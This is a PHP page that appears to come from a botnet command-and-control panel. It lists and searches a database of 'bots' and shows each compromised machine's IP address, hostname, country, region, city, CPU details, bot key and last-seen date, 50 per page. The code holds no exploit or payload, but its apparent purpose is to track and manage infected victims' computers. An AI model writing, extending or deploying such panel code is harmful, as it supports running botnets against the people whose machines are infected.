<?php
	if(isset($_GET['list']))
	{
		$id2fetch = htmlspecialchars($_GET['list']);
		if ($id2fetch < 1 || $id2fetch > 5000000) // I doubt we will get past 5 million bots
			$id2fetch = 1;
	}
	else
		$id2fetch = 1;

	$id2fetchend = $id2fetch * 50;
	$id2fetchstart = $id2fetchend - 50 + 1;

	if(isset($_POST['submit']))
	{
		$field = trim($_POST['field']);

		$search = $conn->prepare("SELECT * FROM bots WHERE LOWER(CONCAT(bot_id, '', bot_key, '', bot_version, '', bot_ip, '', bot_hostname, '', bot_location_country, '', bot_location_region, '', bot_location_city, '', bot_cpu_cores, '', bot_cpu_mhz, '', bot_cpu_bogus, '', bot_cpu_arch, '', bot_cpu_arch2, bot_date_last, '', bot_date_join)) LIKE LOWER(CONCAT('%', :query, '%'))");
		$search->execute(array(
			":query"=>$field
		));
		$rows = $search->rowCount();

		$SEARCHTABLE = '<table id="BotTable">';
		$SEARCHTABLE .= '<tr>';
		$SEARCHTABLE .= '<th>ID</th>';
		$SEARCHTABLE .= '<th>Key</th>';
		$SEARCHTABLE .= '<th>Version</th>';
		$SEARCHTABLE .= '<th>IP</th>';
		$SEARCHTABLE .= '<th>Hostname</th>';
		$SEARCHTABLE .=  '<th>Country</th>';
		$SEARCHTABLE .=  '<th>Region</th>';
		$SEARCHTABLE .=  '<th>City</th>';
		$SEARCHTABLE .=  '<th>Cores</th>';
		$SEARCHTABLE .=  '<th>Mhz</th>';
		$SEARCHTABLE .=  '<th>Bogus</th>';
		$SEARCHTABLE .=  '<th>Bit</th>';
		$SEARCHTABLE .=  '<th>Arch</th>';
		$SEARCHTABLE .=  '<th>Last seen</th>';
		$SEARCHTABLE .=  '<th>Join Date</th>';
		$SEARCHTABLE .=  '</tr>';

		$results = 0;
		while($row = $search->fetch(PDO::FETCH_ASSOC)) {
			$SEARCHTABLE .= '<tr>';
			$SEARCHTABLE .= '<td>' . $row['bot_id'] . '</td>';
			$SEARCHTABLE .= '<td>' . $row['bot_key'] . '</td>';
			$SEARCHTABLE .= '<td>' . $row['bot_version'] . '</td>';
			$SEARCHTABLE .= '<td>' . $row['bot_ip'] . '</td>';
			$SEARCHTABLE .= '<td>' . $row['bot_hostname'] . '</td>';
			$SEARCHTABLE .= '<td>' . $row['bot_location_country'] . '</td>';
			$SEARCHTABLE .= '<td>' . $row['bot_location_region'] . '</td>';
			$SEARCHTABLE .= '<td>' . $row['bot_location_city'] . '</td>';
			$SEARCHTABLE .= '<td>' . $row['bot_cpu_cores'] . '</td>';
			$SEARCHTABLE .= '<td>' . $row['bot_cpu_mhz'] . '</td>';
			$SEARCHTABLE .= '<td>' . $row['bot_cpu_bogus'] . '</td>';
			$SEARCHTABLE .= '<td>' . $row['bot_cpu_arch'] . '</td>';
			$SEARCHTABLE .= '<td>' . $row['bot_cpu_arch2'] . '</td>';
			$SEARCHTABLE .= '<td>' . $row['bot_date_last'] . '</td>';
			$SEARCHTABLE .= '<td>' . $row['bot_date_join'] . '</td>';
			$SEARCHTABLE .= '</tr>';
			$results++;
		}

		$SEARCHTABLE .= "</table>";
	}

	// Display all the bots in a really ugly way xD
	// $select = $conn->prepare("SELECT bot_key, bot_id, bot_version, bot_ip, bot_hostname, bot_location_country, bot_location_region, bot_location_city, bot_cpu_cores, bot_cpu_mhz, bot_cpu_bogus, bot_cpu_arch, bot_cpu_arch2, bot_date_last, bot_date_join FROM bots WHERE `bot_id` BETWEEN :first AND :second");
	$select = $conn->prepare("SELECT * FROM bots WHERE `bot_id` BETWEEN :first AND :second"); // Why didn't I think of this
	$select->execute(array(
		':first'=>$id2fetchstart,
		':second'=>$id2fetchend
	));

	$BOTTABLE = '<table id="BotTable">';

	$BOTTABLE .= '<tr>';
	$BOTTABLE .= '<th>ID</th>';
	$BOTTABLE .= '<th>Key</th>';
	$BOTTABLE .= '<th>Version</th>';
	$BOTTABLE .= '<th>IP</th>';
	$BOTTABLE .= '<th>Hostname</th>';
	$BOTTABLE .=  '<th>Country</th>';
	$BOTTABLE .=  '<th>Region</th>';
	$BOTTABLE .=  '<th>City</th>';
	$BOTTABLE .=  '<th>Cores</th>';
	$BOTTABLE .=  '<th>Mhz</th>';
	$BOTTABLE .=  '<th>Bogus</th>';
	$BOTTABLE .=  '<th>Bit</th>';
	$BOTTABLE .=  '<th>Arch</th>';
	$BOTTABLE .=  '<th>Last seen</th>';
	$BOTTABLE .=  '<th>Join Date</th>';
	$BOTTABLE .=  '</tr>';

	$numrows = 0;
	while($row = $select->fetch(PDO::FETCH_ASSOC)) {

		$BOTTABLE .= '<tr>';
		$BOTTABLE .= '<td>' . $row['bot_id'] . '</td>';
		$BOTTABLE .= '<td>' . $row['bot_key'] . '</td>';
		$BOTTABLE .= '<td>' . $row['bot_version'] . '</td>';
		$BOTTABLE .= '<td>' . $row['bot_ip'] . '</td>';
		$BOTTABLE .= '<td>' . $row['bot_hostname'] . '</td>';
		$BOTTABLE .= '<td>' . $row['bot_location_country'] . '</td>';
		$BOTTABLE .= '<td>' . $row['bot_location_region'] . '</td>';
		$BOTTABLE .= '<td>' . $row['bot_location_city'] . '</td>';
		$BOTTABLE .= '<td>' . $row['bot_cpu_cores'] . '</td>';
		$BOTTABLE .= '<td>' . $row['bot_cpu_mhz'] . '</td>';
		$BOTTABLE .= '<td>' . $row['bot_cpu_bogus'] . '</td>';
		$BOTTABLE .= '<td>' . $row['bot_cpu_arch'] . '</td>';
		$BOTTABLE .= '<td>' . $row['bot_cpu_arch2'] . '</td>';
		$BOTTABLE .= '<td>' . $row['bot_date_last'] . '</td>';
		$BOTTABLE .= '<td>' . $row['bot_date_join'] . '</td>';
		$BOTTABLE .= '</tr>';
		$numrows++;
	}

	$BOTTABLE .= "</table>";
?>

<!-- Search -->
<div>
	<form action="" method="post" id="searchbox">
			<input type="text" name="field" class="box" placeholder="<?php if(isset($results)) echo "Results: " . $results; else echo "Search"; ?>"/> <br/> <br/>
			<input type="submit" name="submit" value="Submit" id="nobutton"/> <br/>
	</form>
</div>

<!-- Bot table -->
<?php
	if (isset($SEARCHTABLE))
		echo $SEARCHTABLE;
	else
		echo $BOTTABLE;
?>

<!-- Page changers -->
<?php
	/* What the fuck have I created */
	if ($id2fetch != 1)
	{
		echo "<a href=\"?p=bots&list=";
		echo $id2fetch - 1;
		echo "\">Page:";
		echo $id2fetch - 1;
		echo "</a>";
	}
	if ($numrows == 50)
	{
		echo "<a href=\"?p=bots&list=";
		echo $id2fetch + 1;
		echo "\">Page: ";
		echo $id2fetch + 1;
		echo "</a>";
	}
	else
		echo $numrows
?>
